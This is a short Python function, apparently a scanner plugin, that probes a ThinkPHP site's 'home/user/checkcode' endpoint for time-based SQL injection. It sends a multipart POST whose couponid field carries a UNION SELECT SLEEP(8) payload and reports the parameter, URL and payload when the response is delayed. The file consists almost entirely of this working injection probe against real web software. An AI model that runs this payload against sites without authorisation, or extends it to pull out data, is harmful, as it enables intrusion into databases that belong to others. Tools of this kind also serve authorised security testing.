import time
import requests
import urllib

def thinkphp_timebased_sqli(url):
    relsult = {
        'name': 'ThinkPHP SQL Injection Vulnerability(time-based)',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
        "DNT": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type": "multipart/form-data; boundary=--------641902708",
        "Accept-Encoding": "gzip, deflate, sdch",
        "Accept-Language": "zh-CN,zh;q=0.8",
    }
    payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--"
    try:
        start_time = time.time()
        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/user/checkcode/')
        response = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if time.time() - start_time >= 8:
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = vurl
            relsult['position'] = 'data'
            relsult['parameter'] = 'couponid'
            relsult['payload'] = payload
        return relsult
    except:
        return relsult